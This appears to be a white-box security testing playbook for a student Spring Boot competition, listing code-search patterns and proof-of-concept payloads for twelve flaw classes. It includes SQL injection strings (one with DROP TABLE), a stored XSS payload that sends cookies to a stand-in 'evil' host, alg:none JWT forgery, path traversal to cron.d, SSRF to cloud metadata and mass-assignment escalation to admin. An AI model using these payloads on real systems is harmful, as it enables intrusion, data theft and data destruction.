# Attack Playbook — Spring Boot ABM (caja blanca)

Per-vulnerability: **how to spot it in code**, and **how to write the PoC**. This is the
scoring checklist for a student Spring Boot competition. Ordered by typical impact.

All PoCs are **read-only proof of access**. Never modify or delete another user's data to
"prove" something — a `GET` that returns someone else's object is the proof.

---

## 1. IDOR / Broken Access Control — score this the most

**Spot it:** every handler that takes an `id` and calls `findById`/`getReferenceById` with no
ownership/role check downstream.

```bash
rg -n "@PathVariable|@RequestParam|findById|getReferenceById" src/main/java
```

Then for each hit, ask: does the service compare the object's owner to
`authentication.principal` (or a `@PreAuthorize`)? If not → IDOR.

**PoC shape** (`.security/poc/SEC-001.http`):
```http
### 1) login as user A, capture token/cookie
POST /api/login {"email":"a@a.com","password":"..."}
### 2) GET A's object (should work)
GET /api/facturas/1
Authorization: Bearer <token_A>
### 3) change the id to B's object (should be denied; if 200 → IDOR)
GET /api/facturas/2
Authorization: Bearer <token_A>
```
A `200` with B's data on step 3 = confirmed IDOR. Report the enumeration risk (ids are
sequential → dump everything).

---

## 2. SQL injection

**Spot it:**
```bash
rg -n "createNativeQuery|@Query.*\+|nativeQuery.*\+|executeQuery|Sort\.by\((?!Sort\.)" src/main/java
```
Concatenation into `nativeQuery`/`@Query`, or a `Sort.by(userInput)`/`PageRequest` built from a
request param.

**PoC:** in a search/login field, send `' OR '1'='1` (returns all rows) or `' AND '1'='2`
(returns none — confirms boolean-based injection). For a login bypass: `' OR '1'='1'--`.
For `Sort`: `?sort=id;DROP TABLE usuario` or a column name you shouldn't see.

---

## 3. Mass assignment / privilege escalation

**Spot it:** `@RequestBody`/`@ModelAttribute` bound directly to a `@Entity` that has `rol`,
`role`, `activo`, `owner`, `balance`, `admin` fields.

```bash
rg -n "@RequestBody|@ModelAttribute" src/main/java | rg -i "entity|usuario|cliente"
```

**PoC:**
```http
POST /api/usuarios
{"nombre":"x","email":"x@x.com","password":"pass1234","rol":"ADMIN","activo":true}
```
If the created user is an admin → confirmed. On an update endpoint, change another user's `id`
in the body → IDOR-write.

---

## 4. Authentication bypass / weak login

**Spot it:** a login handler that doesn't verify the password, accepts `password=null`,
compares with `equals` on a plaintext field, or has an SQLi in the auth query (combine #2 +
#4 for a login-bypass P0). Default accounts (`admin`/`admin`, `root`/`root`).

**PoC:** `{"email":"admin@admin.com","password":"wrong"}` — if it still returns a token, it's
an auth bypass.

---

## 5. JWT flaws (forged admin)

**Spot it:** algorithm not pinned (accepts `alg=none`), secret hardcoded/committed, no
`exp`/`iss`/`aud` validation, or an old `jjwt`/`nimbus` version.

```bash
rg -n "parseClaimsJws|parse\(|signWith|alg|secret|HS256|RS256" src/main/java
rg -n "jwt" src/main/resources/application*.yml
```

**PoC:** craft a token with `alg:none` and `{"rol":"ADMIN"}` — if accepted, forged-admin. Or
if `jwt.secret` is committed, sign a valid `ADMIN` token with it. Report the leaked secret as P0.

---

## 6. Actuator / config / secret leakage

**Spot it:**
```bash
rg -n "exposure|include:|actuator|heapdump|devtools|datasource|password|secret|api-key|apiKey" src/main/resources
```
`exposure.include` containing `*`/`env`/`heapdump` → P0 (heapdump + env dump recover secrets).
Committed DB creds / `jwt.secret` / API keys → P0.

**PoC:** `GET /actuator/env`, `GET /actuator/heapdump` (if exposed). For committed secrets,
the PoC is the exact file:line in git history (run `gitleaks`).

---

## 7. XSS (stored / reflected)

**Spot it:** `th:utext`, `dangerouslySetInnerHTML`, `innerHTML`, or an echoed `@RequestParam`
in a view without `th:text`.

```bash
rg -n "th:utext|dangerouslySetInnerHTML|innerHTML" src/main
```

**PoC (stored):** submit `<script>fetch('//evil/'+document.cookie)</script>` into a field that
renders with `th:utext`; view the list page as another user — the script executes.
**PoC (reflected):** `GET /buscar?q=<script>alert(1)</script>` — if the payload reflects
unescaped, confirmed.

---

## 8. CSRF

**Spot it:** `.csrf().disable()` (or `.ignoringRequestMatchers` on a mutating endpoint) **with
cookie-based session auth** (not a JWT header). Without CSRF protection, any site can submit a
form as your logged-in user.

**PoC:** an HTML page on another origin that auto-submits
`<form method=post action="https://victim/api/productos">` — since the session cookie rides
along, the action executes. (Report as a finding with the config line; don't need a live site.)

---

## 9. CORS misconfiguration

**Spot it:** `allowedOriginPatterns("*")` / `addCorsMappings("*")` combined with
`allowCredentials(true)`. Allows any origin to make credentialed cross-origin requests.

**PoC:** a cross-origin `fetch(..., {credentials:'include'})` from `evil.com` reading the
response → data theft. Report the exact config line.

---

## 10. Path traversal / file upload

**Spot it:** `new File(UPLOAD_DIR + file.getOriginalFilename())`, or any path built from a
request param without normalization + prefix check.

**PoC:** upload a file named `../../etc/cron.d/evil`, or request `?file=../../application.yml`
— if it resolves outside the intended dir, confirmed.

---

## 11. SSRF

**Spot it:** `new URL(userInput).openStream()`, `RestTemplate`/`WebClient` built from a request
param, any user-supplied URL fetched server-side.

**PoC:** pass `http://169.254.169.254/latest/meta-data/` (cloud metadata) or
`http://localhost:8080/actuator/env`. If the server fetches it and returns content → confirmed.

---

## 12. Verbose errors / information disclosure

**Spot it:** `spring.mvc` / `server.error` config that exposes stack traces, or a
`@ControllerAdvice` that returns `e.getMessage()`/`e.printStackTrace()` to the client. A leaked
stack trace reveals package structure, framework versions, and internal paths.

**PoC:** send malformed input to trigger a 500; if a stack trace or SQL error returns, confirmed.

---

## Scoring tip

In a student competition, the highest-yield findings are almost always, in order:
1. **Secrets/actuator** (instant P0, zero exploitation skill)
2. **IDOR on every `findById`** (volume — each missing check is a finding)
3. **Mass assignment** (one extra field = admin)
4. **SQLi in search** (classic)
5. **JWT secret committed** (forged admin)

Report **each** missing ownership check as its own finding — a bulk "IDOR everywhere" is worth
more as N concrete `file:line` writeups than as one vague note.
